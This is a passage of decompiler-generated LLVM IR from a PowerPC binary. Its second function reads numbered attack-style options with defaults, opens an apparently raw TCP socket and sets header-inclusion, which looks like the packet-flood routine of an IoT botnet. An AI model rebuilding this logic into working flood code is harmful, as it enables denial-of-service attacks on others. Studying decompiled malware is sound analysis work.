  %v1_10003e7c = call i32 @__asm_rlwimi(i32 %v1_10003abc, i32 20, i32 11, i32 11)
  store i32 %v1_10003e7c, i32* %r0.global-to-local, align 4
  %v1_10003e80 = call i32 @__asm_rlwimi(i32 %v1_10003ad4, i32 19, i32 12, i32 12)
  store i32 %v1_10003e80, i32* %r0.global-to-local, align 4
  %v1_10003e84 = call i32 @__asm_rlwimi(i32 %v1_10003aec, i32 18, i32 13, i32 13)
  store i32 %v1_10003e84, i32* %r0.global-to-local, align 4
  %v1_10003e88 = call i32 @__asm_rlwimi(i32 %v1_10003b04, i32 17, i32 14, i32 14)
  store i32 %v1_10003e88, i32* %r0.global-to-local, align 4
  %v1_10003e8c = call i32 @__asm_rlwimi(i32 %v1_10003b1c, i32 16, i32 15, i32 15)
  store i32 %v1_10003e8c, i32* %r0.global-to-local, align 4
  %v1_10003e90 = load i32, i32* @r30, align 4
  %v2_10003e90 = add i32 %v1_10003e90, 12
  %v3_10003e90 = inttoptr i32 %v2_10003e90 to i32*
  store i32 %v1_10003e8c, i32* %v3_10003e90, align 4
  %v0_10003e94 = call i32 @function_10007ed4()
  store i32 %v0_10003e94, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003e98

dec_label_pc_10003e98:                            ; preds = %dec_label_pc_10003ba8, %dec_label_pc_10003e04
  %v3_10003e98 = load i32, i32* %stack_var_-408, align 4
  %v1_10003e9c = add i32 %v3_10003e98, 1
  store i32 %v1_10003e9c, i32* %r9.global-to-local, align 4
  %v1_10003ea0 = load i32, i32* %r21.global-to-local, align 4
  %v2_10003ea0 = icmp slt i32 %v1_10003e9c, %v1_10003ea0
  %v4_10003ea0 = icmp eq i32 %v1_10003e9c, %v1_10003ea0
  store i1 %v4_10003ea0, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10003e9c, i32* %stack_var_-408, align 4
  br i1 %v2_10003ea0, label %dec_label_pc_10003ba4, label %dec_label_pc_10003eac.loopexit

dec_label_pc_10003eac.loopexit:                   ; preds = %dec_label_pc_10003e98
  %v0_10003eb8.pre.pre = load i1, i1* %cr3_eq.global-to-local, align 1
  %v1_10003eb8.pre.pre = load i1, i1* %cr3_lt.global-to-local, align 1
  br label %dec_label_pc_10003eac

dec_label_pc_10003eac:                            ; preds = %dec_label_pc_10003eac.loopexit, %dec_label_pc_10003b84
  %v1_10003eb8.pre = phi i1 [ %v1_10003eb8.pre.pre, %dec_label_pc_10003eac.loopexit ], [ %v1_10003b84, %dec_label_pc_10003b84 ]
  %v0_10003eb8.pre = phi i1 [ %v0_10003eb8.pre.pre, %dec_label_pc_10003eac.loopexit ], [ %v3_10003b84, %dec_label_pc_10003b84 ]
  %v0_10003eac = load i32, i32* %r27.global-to-local, align 4
  %v3_10003eac = icmp eq i32 %v0_10003eac, 0
  store i1 %v3_10003eac, i1* %cr2_eq.global-to-local, align 1
  %v0_10003eb0 = load i32, i32* %r25.global-to-local, align 4
  %v1_10003eb0 = add i32 %v0_10003eb0, 40
  store i32 %v1_10003eb0, i32* %r26.global-to-local, align 4
  %v1_10003eb4 = add i32 %v0_10003eb0, 20
  store i32 %v1_10003eb4, i32* @r31, align 4
  br label %dec_label_pc_10003eb8.outer

dec_label_pc_10003eb8.outer:                      ; preds = %dec_label_pc_10003f8c, %dec_label_pc_10003eac
  %v1_10003eb8.ph = phi i1 [ %v1_10003eb8.pre, %dec_label_pc_10003eac ], [ %v1_10003f8c, %dec_label_pc_10003f8c ]
  %v0_10003eb8.ph = phi i1 [ %v0_10003eb8.pre, %dec_label_pc_10003eac ], [ %v0_10003f8c, %dec_label_pc_10003f8c ]
  %v2_10003eb8 = or i1 %v1_10003eb8.ph, %v0_10003eb8.ph
  br label %dec_label_pc_10003eb8

dec_label_pc_10003eb8:                            ; preds = %dec_label_pc_10003eb8.outer, %dec_label_pc_10003eb8
  br i1 %v2_10003eb8, label %dec_label_pc_10003eb8, label %dec_label_pc_10003ebc

dec_label_pc_10003ebc:                            ; preds = %dec_label_pc_10003eb8, %dec_label_pc_10003f8c
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-408, align 4
  %v0_10003ecc = load i32, i32* %r19.global-to-local, align 4
  %v4_10003ecc = icmp eq i32 %v0_10003ecc, 65535
  store i1 %v4_10003ecc, i1* %cr4_eq.global-to-local, align 1
  %v0_10003ed0 = load i32, i32* @r31, align 4
  %v1_10003ed0 = urem i32 %v0_10003ed0, 65536
  store i32 %v1_10003ed0, i32* @r30, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10003edc

dec_label_pc_10003edc:                            ; preds = %dec_label_pc_10003ef8.dec_label_pc_10003edc_crit_edge, %dec_label_pc_10003ebc
  %v0_10003ee8 = phi i1 [ %v0_10003ee8.pre, %dec_label_pc_10003ef8.dec_label_pc_10003edc_crit_edge ], [ %v4_10003ecc, %dec_label_pc_10003ebc ]
  %v0_10003edc = phi i32 [ %v1_10003f7c, %dec_label_pc_10003ef8.dec_label_pc_10003edc_crit_edge ], [ 0, %dec_label_pc_10003ebc ]
  %v1_10003edc = mul i32 %v0_10003edc, 4
  store i32 %v1_10003edc, i32* %r0.global-to-local, align 4
  %v0_10003ee0 = load i32, i32* %r23.global-to-local, align 4
  %v2_10003ee0 = add i32 %v0_10003ee0, %v1_10003edc
  %v3_10003ee0 = inttoptr i32 %v2_10003ee0 to i32*
  %v4_10003ee0 = load i32, i32* %v3_10003ee0, align 4
  store i32 %v4_10003ee0, i32* @r29, align 4
  %v1_10003ee4 = add i32 %v4_10003ee0, 20
  store i32 %v1_10003ee4, i32* %r28.global-to-local, align 4
  br i1 %v0_10003ee8, label %dec_label_pc_10003f94, label %dec_label_pc_10003eec

dec_label_pc_10003eec:                            ; preds = %dec_label_pc_10003edc
  %v1_10003eec = add i32 %v4_10003ee0, 40
  store i32 %v1_10003eec, i32* @r3, align 4
  %v0_10003ef0 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10003ef0, i32* @r4, align 4
  %v0_10003ef4 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10003ef4, label %dec_label_pc_10003ef8, label %dec_label_pc_10003fa8

dec_label_pc_10003ef8:                            ; preds = %dec_label_pc_10003eec, %dec_label_pc_10003f94, %dec_label_pc_10003fa8
  %v2_10003ef8 = phi i32 [ %v4_10003ee0, %dec_label_pc_10003eec ], [ %v0_10003fa0, %dec_label_pc_10003f94 ], [ %v2_10003ef8.pre, %dec_label_pc_10003fa8 ]
  %v0_10003ef8 = load i32, i32* %r27.global-to-local, align 4
  %v1_10003ef8 = trunc i32 %v0_10003ef8 to i16
  %v3_10003ef8 = add i32 %v2_10003ef8, 10
  %v4_10003ef8 = inttoptr i32 %v3_10003ef8 to i16*
  store i16 %v1_10003ef8, i16* %v4_10003ef8, align 2
  %v0_10003f00 = load i32, i32* @r29, align 4
  store i32 %v0_10003f00, i32* @r3, align 4
  %v2_10003f04 = call i32 @function_100060d4(i32 %v0_10003f00, i32 20)
  %v3_10003f04 = trunc i32 %v2_10003f04 to i16
  store i32 %v2_10003f04, i32* %r3.global-to-local, align 4
  %v3_10003f08 = load i32, i32* %stack_var_-408, align 4
  store i32 %v3_10003f08, i32* %r9.global-to-local, align 4
  %v3_10003f0c = load i32, i32* @r29, align 4
  %v4_10003f0c = add i32 %v3_10003f0c, 10
  %v5_10003f0c = inttoptr i32 %v4_10003f0c to i16*
  store i16 %v3_10003f04, i16* %v5_10003f0c, align 2
  %v0_10003f10 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10003f10, i32* @r4, align 4
  %v0_10003f14 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003f14 = mul i32 %v0_10003f14, 16
  store i32 %v1_10003f14, i32* %r9.global-to-local, align 4
  %v0_10003f18 = load i32, i32* %r27.global-to-local, align 4
  %v1_10003f18 = trunc i32 %v0_10003f18 to i16
  %v3_10003f18 = add i32 %v0_10003f10, 16
  %v4_10003f18 = inttoptr i32 %v3_10003f18 to i16*
  store i16 %v1_10003f18, i16* %v4_10003f18, align 2
  %v0_10003f1c = load i32, i32* %r22.global-to-local, align 4
  %v1_10003f1c = load i32, i32* %r9.global-to-local, align 4
  %v2_10003f1c = add i32 %v1_10003f1c, %v0_10003f1c
  store i32 %v2_10003f1c, i32* %r9.global-to-local, align 4
  %v0_10003f20 = load i32, i32* @r30, align 4
  %v1_10003f24 = add i32 %v2_10003f1c, 4
  %v2_10003f24 = inttoptr i32 %v1_10003f24 to i32*
  %v3_10003f24 = load i32, i32* %v2_10003f24, align 4
  store i32 %v3_10003f24, i32* %r11.global-to-local, align 4
  %v0_10003f28 = load i32, i32* @r31, align 4
  %v0_10003f2c = load i32, i32* @r29, align 4
  store i32 %v0_10003f2c, i32* %r3.global-to-local, align 4
  %v1_10003f30 = load i32, i32* %r28.global-to-local, align 4
  %v2_10003f30 = add i32 %v1_10003f30, 4
  %v3_10003f30 = inttoptr i32 %v2_10003f30 to i32*
  store i32 %v3_10003f24, i32* %v3_10003f30, align 4
  %v0_10003f34 = load i32, i32* %r11.global-to-local, align 4
  %v1_10003f34 = add i32 %v0_10003f34, 1
  store i32 %v1_10003f34, i32* %r11.global-to-local, align 4
  %v1_10003f38 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003f38 = add i32 %v1_10003f38, 4
  %v3_10003f38 = inttoptr i32 %v2_10003f38 to i32*
  store i32 %v1_10003f34, i32* %v3_10003f38, align 4
  %v0_10003f3c = load i32, i32* %r9.global-to-local, align 4
  %v1_10003f3c = add i32 %v0_10003f3c, 8
  %v2_10003f3c = inttoptr i32 %v1_10003f3c to i32*
  %v3_10003f3c = load i32, i32* %v2_10003f3c, align 4
  store i32 %v3_10003f3c, i32* %r0.global-to-local, align 4
  %v1_10003f40 = load i32, i32* %r28.global-to-local, align 4
  %v2_10003f40 = add i32 %v1_10003f40, 8
  %v3_10003f40 = inttoptr i32 %v2_10003f40 to i32*
  store i32 %v3_10003f3c, i32* %v3_10003f40, align 4
  %v4_10003f44 = call i32 @function_10006138(i32 %v0_10003f2c, i32 %v0_10003f10, i32 %v0_10003f20, i32 %v0_10003f28)
  %v5_10003f44 = trunc i32 %v4_10003f44 to i16
  store i32 %v4_10003f44, i32* %r3.global-to-local, align 4
  %v3_10003f48 = load i32, i32* %stack_var_-408, align 4
  store i32 %v3_10003f48, i32* %r7.global-to-local, align 4
  %v0_10003f4c = load i32, i32* %r28.global-to-local, align 4
  %v1_10003f4c = add i32 %v0_10003f4c, 2
  %v2_10003f4c = inttoptr i32 %v1_10003f4c to i16*
  %v3_10003f4c = load i16, i16* %v2_10003f4c, align 2
  %v4_10003f4c = zext i16 %v3_10003f4c to i32
  store i32 %v4_10003f4c, i32* %r0.global-to-local, align 4
  %v0_10003f50 = load i32, i32* @r29, align 4
  %v1_10003f54 = mul i32 %v3_10003f48, 24
  store i32 %v1_10003f54, i32* %r7.global-to-local, align 4
  %v4_10003f58 = add i32 %v0_10003f4c, 16
  %v5_10003f58 = inttoptr i32 %v4_10003f58 to i16*
  store i16 %v5_10003f44, i16* %v5_10003f58, align 2
  %v0_10003f5c = load i32, i32* %r26.global-to-local, align 4
  %v0_10003f60 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10003f60, i32* %r3.global-to-local, align 4
  %v0_10003f64 = load i32, i32* %r7.global-to-local, align 4
  %v1_10003f64 = load i32, i32* %r20.global-to-local, align 4
  %v2_10003f64 = add i32 %v1_10003f64, %v0_10003f64
  store i32 %v2_10003f64, i32* %r7.global-to-local, align 4
  %v0_10003f6c = load i32, i32* %r0.global-to-local, align 4
  %v1_10003f6c = trunc i32 %v0_10003f6c to i16
  %v3_10003f6c = add i32 %v2_10003f64, 2
  %v4_10003f6c = inttoptr i32 %v3_10003f6c to i16*
  store i16 %v1_10003f6c, i16* %v4_10003f6c, align 2
  store i32 16, i32* %r8.global-to-local, align 4
  store i32 268451704, i32* @lr, align 4
  %v6_10003f74 = call i32 @function_1000c140(i32 %v0_10003f60, i32 %v0_10003f50, i32 %v0_10003f5c, i32 16384, i32 %v2_10003f64, i32 16)
  store i32 %v6_10003f74, i32* %r3.global-to-local, align 4
  %v3_10003f78 = load i32, i32* %stack_var_-408, align 4
  store i32 %v3_10003f78, i32* %r9.global-to-local, align 4
  %v1_10003f7c = add i32 %v3_10003f78, 1
  store i32 %v1_10003f7c, i32* %r0.global-to-local, align 4
  %v1_10003f80 = load i32, i32* %r21.global-to-local, align 4
  %v2_10003f80 = icmp slt i32 %v1_10003f7c, %v1_10003f80
  %v4_10003f80 = icmp eq i32 %v1_10003f7c, %v1_10003f80
  store i1 %v4_10003f80, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10003f7c, i32* %stack_var_-408, align 4
  br i1 %v2_10003f80, label %dec_label_pc_10003ef8.dec_label_pc_10003edc_crit_edge, label %dec_label_pc_10003f8c

dec_label_pc_10003ef8.dec_label_pc_10003edc_crit_edge: ; preds = %dec_label_pc_10003ef8
  %v0_10003ee8.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  br label %dec_label_pc_10003edc

dec_label_pc_10003f8c:                            ; preds = %dec_label_pc_10003ef8
  %v0_10003f8c = load i1, i1* %cr3_eq.global-to-local, align 1
  %v1_10003f8c = load i1, i1* %cr3_lt.global-to-local, align 1
  %v2_10003f8c = or i1 %v0_10003f8c, %v1_10003f8c
  br i1 %v2_10003f8c, label %dec_label_pc_10003eb8.outer, label %dec_label_pc_10003ebc

dec_label_pc_10003f94:                            ; preds = %dec_label_pc_10003edc
  %v0_10003f94 = call i32 @function_10007ca8()
  %v1_10003f94 = trunc i32 %v0_10003f94 to i16
  %v0_10003f98 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10003f98, i32* @r4, align 4
  %v3_10003f9c = load i32, i32* @r29, align 4
  %v4_10003f9c = add i32 %v3_10003f9c, 4
  %v5_10003f9c = inttoptr i32 %v4_10003f9c to i16*
  store i16 %v1_10003f94, i16* %v5_10003f9c, align 2
  %v0_10003fa0 = load i32, i32* @r29, align 4
  %v1_10003fa0 = add i32 %v0_10003fa0, 40
  store i32 %v1_10003fa0, i32* @r3, align 4
  %v0_10003fa4 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10003fa4, label %dec_label_pc_10003ef8, label %dec_label_pc_10003fa8

dec_label_pc_10003fa8:                            ; preds = %dec_label_pc_10003eec, %dec_label_pc_10003f94
  %v0_10003fa8 = call i32 @function_10007ed4()
  store i32 %v0_10003fa8, i32* %r3.global-to-local, align 4
  %v2_10003ef8.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10003ef8

; uselistorder directives
  uselistorder i32 %v0_10003fa0, { 1, 0 }
  uselistorder i1 %v1_10003f8c, { 1, 0 }
  uselistorder i1 %v0_10003f8c, { 1, 0 }
  uselistorder i32 %v1_10003f7c, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v4_10003f44, { 1, 0 }
  uselistorder i32 %v0_10003f10, { 1, 0, 2 }
  uselistorder i32 %v2_10003f04, { 1, 0 }
  uselistorder i32 %v1_10003edc, { 1, 0 }
  uselistorder i32 %v1_10003e9c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_10003e20, { 1, 0, 2 }
  uselistorder i32 %v1_10003e1c, { 1, 0 }
  uselistorder i32 %v1_10003db4, { 1, 0 }
  uselistorder i32 %v1_10003d80, { 1, 0 }
  uselistorder i32 %v0_10003d00, { 1, 0 }
  uselistorder i32 %v2_10003cf4, { 1, 2, 0 }
  uselistorder i1 %v4_10003c78, { 1, 0 }
  uselistorder i16 %storemerge, { 1, 0 }
  uselistorder i32 %v3_10003cd8, { 1, 3, 0, 2 }
  uselistorder i32 %v1_10003cb4, { 1, 0 }
  uselistorder i32 %v1_10003a5c, { 1, 0 }
  uselistorder i8 %v5_10003a48, { 1, 0 }
  uselistorder i8 %v5_10003a10, { 1, 0 }
  uselistorder i16 %tmp13, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 29, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 0, 1 }
  uselistorder i32* %r25.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r24.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 25, 18, 19, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i1* %cr3_lt.global-to-local, { 1, 0, 2 }
  uselistorder i32 1179648, { 2, 0, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_10003fa8, { 1, 0 }
  uselistorder label %dec_label_pc_10003ef8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10003ebc, { 1, 0 }
  uselistorder label %dec_label_pc_10003eb8, { 1, 0 }
  uselistorder label %dec_label_pc_10003e98, { 1, 0 }
  uselistorder label %dec_label_pc_10003e04, { 1, 0 }
  uselistorder label %dec_label_pc_10003d14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10003c94, { 1, 2, 0 }
}

define i32 @function_10003fb0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10003fb0:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_10003fb4 = load i32, i32* @lr, align 4
  store i32 %v0_10003fb4, i32* %r0.global-to-local, align 4
  %v0_10003fb8 = call i32 @__asm_mfcr()
  store i32 %v0_10003fb8, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r25.global-to-local, align 4
  %v0_10003fc8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10003fb8, i32* %r21.global-to-local, align 4
  %v0_10004008 = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_10004010 = load i32, i32* @r29, align 4
  store i32 %arg3, i32* @r29, align 4
  %v0_10004018 = load i32, i32* @r30, align 4
  store i32 268451876, i32* @lr, align 4
  %v2_10004020 = call i32 @function_1000c548(i32 4, i32 4)
  store i32 %v2_10004020, i32* %r22.global-to-local, align 4
  %v0_10004028 = load i32, i32* @r28, align 4
  %v0_10004034 = load i32, i32* @r29, align 4
  store i32 %v0_10004034, i32* %r3.global-to-local, align 4
  store i32 268451900, i32* @lr, align 4
  %v4_10004038 = inttoptr i32 %v0_10004028 to i32*
  %v5_10004038 = call i32 @function_1000235c(i32 %v0_10004034, i32* %v4_10004038, i32 2, i32 0)
  %v5_10004048 = trunc i32 %v5_10004038 to i8
  %v0_10004050 = load i32, i32* @r28, align 4
  %v0_10004054 = load i32, i32* @r29, align 4
  store i32 %v0_10004054, i32* %r3.global-to-local, align 4
  store i32 268451932, i32* @lr, align 4
  %v4_10004058 = inttoptr i32 %v0_10004050 to i32*
  %v5_10004058 = call i32 @function_1000235c(i32 %v0_10004054, i32* %v4_10004058, i32 3, i32 65535)
  %v0_1000405c = load i32, i32* @r28, align 4
  store i32 %v5_10004058, i32* %r18.global-to-local, align 4
  %v0_1000406c = load i32, i32* @r29, align 4
  store i32 %v0_1000406c, i32* %r3.global-to-local, align 4
  store i32 268451956, i32* @lr, align 4
  %v4_10004070 = inttoptr i32 %v0_1000405c to i32*
  %v5_10004070 = call i32 @function_1000235c(i32 %v0_1000406c, i32* %v4_10004070, i32 4, i32 64)
  %v0_10004074 = load i32, i32* @r28, align 4
  %v5_10004080 = trunc i32 %v5_10004070 to i8
  %v0_10004088 = load i32, i32* @r29, align 4
  store i32 %v0_10004088, i32* %r3.global-to-local, align 4
  store i32 268451984, i32* @lr, align 4
  %v4_1000408c = inttoptr i32 %v0_10004074 to i32*
  %v5_1000408c = call i32 @function_1000235c(i32 %v0_10004088, i32* %v4_1000408c, i32 5, i32 0)
  %v0_1000409c = load i32, i32* @r28, align 4
  %v1_100040a0 = urem i32 %v5_1000408c, 256
  store i32 %v1_100040a0, i32* @r31, align 4
  %v0_100040a4 = load i32, i32* @r29, align 4
  store i32 %v0_100040a4, i32* %r3.global-to-local, align 4
  store i32 268452012, i32* @lr, align 4
  %v4_100040a8 = inttoptr i32 %v0_1000409c to i32*
  %v5_100040a8 = call i32 @function_1000235c(i32 %v0_100040a4, i32* %v4_100040a8, i32 6, i32 65535)
  %v0_100040b0 = load i32, i32* @r28, align 4
  store i32 %v5_100040a8, i32* %r19.global-to-local, align 4
  %v0_100040c0 = load i32, i32* @r29, align 4
  store i32 %v0_100040c0, i32* %r3.global-to-local, align 4
  store i32 268452040, i32* @lr, align 4
  %v4_100040c4 = inttoptr i32 %v0_100040b0 to i32*
  %v5_100040c4 = call i32 @function_1000235c(i32 %v0_100040c0, i32* %v4_100040c4, i32 7, i32 65535)
  %v0_100040cc = load i32, i32* @r28, align 4
  store i32 %v5_100040c4, i32* %r20.global-to-local, align 4
  %v0_100040dc = load i32, i32* @r29, align 4
  store i32 %v0_100040dc, i32* %r3.global-to-local, align 4
  store i32 268452068, i32* @lr, align 4
  %v4_100040e0 = inttoptr i32 %v0_100040cc to i32*
  %v5_100040e0 = call i32 @function_1000235c(i32 %v0_100040dc, i32* %v4_100040e0, i32 17, i32 65535)
  %v0_100040e8 = load i32, i32* @r28, align 4
  store i32 %v5_100040e0, i32* %r15.global-to-local, align 4
  %v0_100040f8 = load i32, i32* @r29, align 4
  store i32 %v0_100040f8, i32* %r3.global-to-local, align 4
  store i32 268452096, i32* @lr, align 4
  %v4_100040fc = inttoptr i32 %v0_100040e8 to i32*
  %v5_100040fc = call i32 @function_1000235c(i32 %v0_100040f8, i32* %v4_100040fc, i32 18, i32 65535)
  %v0_10004100 = load i32, i32* @r28, align 4
  store i32 %v5_100040fc, i32* %r17.global-to-local, align 4
  %v0_10004110 = load i32, i32* @r29, align 4
  store i32 %v0_10004110, i32* %r3.global-to-local, align 4
  store i32 268452120, i32* @lr, align 4
  %v4_10004114 = inttoptr i32 %v0_10004100 to i32*
  %v5_10004114 = call i32 @function_1000235c(i32 %v0_10004110, i32* %v4_10004114, i32 11, i32 0)
  %v0_10004118 = load i32, i32* @r28, align 4
  %v0_10004128 = load i32, i32* @r29, align 4
  store i32 %v0_10004128, i32* %r3.global-to-local, align 4
  store i32 268452144, i32* @lr, align 4
  %v4_1000412c = inttoptr i32 %v0_10004118 to i32*
  %v5_1000412c = call i32 @function_1000235c(i32 %v0_10004128, i32* %v4_1000412c, i32 12, i32 1)
  %v0_10004130 = load i32, i32* @r28, align 4
  store i32 %v5_1000412c, i32* %r14.global-to-local, align 4
  %v0_10004140 = load i32, i32* @r29, align 4
  store i32 %v0_10004140, i32* %r3.global-to-local, align 4
  store i32 268452168, i32* @lr, align 4
  %v4_10004144 = inttoptr i32 %v0_10004130 to i32*
  %v5_10004144 = call i32 @function_1000235c(i32 %v0_10004140, i32* %v4_10004144, i32 13, i32 0)
  %v0_10004148 = load i32, i32* @r28, align 4
  store i32 %v5_10004144, i32* %r24.global-to-local, align 4
  %v0_10004158 = load i32, i32* @r29, align 4
  store i32 %v0_10004158, i32* %r3.global-to-local, align 4
  store i32 268452192, i32* @lr, align 4
  %v4_1000415c = inttoptr i32 %v0_10004148 to i32*
  %v5_1000415c = call i32 @function_1000235c(i32 %v0_10004158, i32* %v4_1000415c, i32 14, i32 0)
  %v0_10004160 = load i32, i32* @r28, align 4
  store i32 %v5_1000415c, i32* %r27.global-to-local, align 4
  %v0_10004170 = load i32, i32* @r29, align 4
  store i32 %v0_10004170, i32* %r3.global-to-local, align 4
  store i32 268452216, i32* @lr, align 4
  %v4_10004174 = inttoptr i32 %v0_10004160 to i32*
  %v5_10004174 = call i32 @function_1000235c(i32 %v0_10004170, i32* %v4_10004174, i32 15, i32 0)
  %v0_10004178 = load i32, i32* @r28, align 4
  store i32 %v5_10004174, i32* %r26.global-to-local, align 4
  %v0_10004188 = load i32, i32* @r29, align 4
  store i32 %v0_10004188, i32* %r3.global-to-local, align 4
  store i32 268452240, i32* @lr, align 4
  %v4_1000418c = inttoptr i32 %v0_10004178 to i32*
  %v5_1000418c = call i32 @function_1000235c(i32 %v0_10004188, i32* %v4_1000418c, i32 16, i32 0)
  %v0_10004190 = load i32, i32* @r28, align 4
  store i32 %v5_1000418c, i32* %r30.global-to-local, align 4
  %v0_100041a0 = load i32, i32* @r29, align 4
  store i32 %v0_100041a0, i32* %r3.global-to-local, align 4
  store i32 268452264, i32* @lr, align 4
  %v4_100041a4 = inttoptr i32 %v0_10004190 to i32*
  %v5_100041a4 = call i32 @function_1000235c(i32 %v0_100041a0, i32* %v4_100041a4, i32 0, i32 512)
  %v0_100041a8 = load i32, i32* @r28, align 4
  store i32 %v5_100041a4, i32* %r16.global-to-local, align 4
  %v0_100041b8 = load i32, i32* @r29, align 4
  store i32 %v0_100041b8, i32* %r3.global-to-local, align 4
  store i32 268452288, i32* @lr, align 4
  %v4_100041bc = inttoptr i32 %v0_100041a8 to i32*
  %v5_100041bc = call i32 @function_1000235c(i32 %v0_100041b8, i32* %v4_100041bc, i32 1, i32 1)
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_100041c4 = load i32, i32* @global_var_1001eb10.71, align 4
  %v1_100041c8 = urem i32 %v5_100041bc, 256
  %v0_100041cc = load i32, i32* @r28, align 4
  %v0_100041d8 = load i32, i32* @r29, align 4
  store i32 %v0_100041d8, i32* %r3.global-to-local, align 4
  store i32 268452320, i32* @lr, align 4
  %v5_100041dc = inttoptr i32 %v0_100041cc to i32*
  %v6_100041dc = call i32 @function_100022dc(i32 %v0_100041d8, i32* %v5_100041dc, i32 25, i32 %v3_100041c4, i32 268566528)
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268452340, i32* @lr, align 4
  %v3_100041f0 = call i32 @function_1000c1bc(i32 2, i32 3, i32 6)
  store i32 %v3_100041f0, i32* %r3.global-to-local, align 4
  %v3_100041f4 = icmp eq i32 %v3_100041f0, -1
  store i32 %v3_100041f0, i32* %r23.global-to-local, align 4
  br i1 %v3_100041f4, label %dec_label_pc_10004534, label %dec_label_pc_10004200

dec_label_pc_10004200:                            ; preds = %dec_label_pc_10003fb0
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_1000420c = ptrtoint i32* %stack_var_-136 to i32
  store i32 4, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-136, align 4
  store i32 268452380, i32* @lr, align 4
  %v5_10004218 = call i32 @function_1000c180(i32 0, i32 3, i32 %v2_1000420c, i32 4, i32 4)
  store i32 %v5_10004218, i32* %r3.global-to-local, align 4
  %v3_1000421c = icmp eq i32 %v5_10004218, -1
  br i1 %v3_1000421c, label %dec_label_pc_1000452c, label %dec_label_pc_10004224

dec_label_pc_10004224:                            ; preds = %dec_label_pc_10004200
  %v0_10004224 = load i32, i32* %r21.global-to-local, align 4
  %v1_10004224 = icmp slt i32 %v0_10004224, 0
  %v3_10004224 = icmp eq i32 %v0_10004224, 0
  store i1 %v1_10004224, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_10004224, i1* %cr4_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-136, align 4
  %v0_10004230 = load i32, i32* %r18.global-to-local, align 4
  %v1_10004230 = urem i32 %v0_10004230, 65536
  store i32 %v1_10004230, i32* %r18.global-to-local, align 4
  %v0_10004234 = load i32, i32* %r19.global-to-local, align 4
  %v1_10004234 = urem i32 %v0_10004234, 65536
  store i32 %v1_10004234, i32* %r19.global-to-local, align 4
  %v0_10004238 = load i32, i32* %r20.global-to-local, align 4
  %v1_10004238 = urem i32 %v0_10004238, 65536
  store i32 %v1_10004238, i32* %r20.global-to-local, align 4
  %tmp40 = icmp slt i32 %v0_10004224, 1
  br i1 %tmp40, label %dec_label_pc_1000450c, label %dec_label_pc_10004240

dec_label_pc_10004240:                            ; preds = %dec_label_pc_10004224
  %v0_10004244 = load i32, i32* %r24.global-to-local, align 4
  %v1_10004244 = urem i32 %v0_10004244, 256
  %v0_10004248 = load i32, i32* %r16.global-to-local, align 4
  %v1_10004248 = add i32 %v0_10004248, 40
  store i32 %v1_10004248, i32* %r24.global-to-local, align 4
  %v3_1000424c = icmp eq i32 %v1_10004244, 0
  store i1 %v3_1000424c, i1* %cr3_eq.global-to-local, align 1
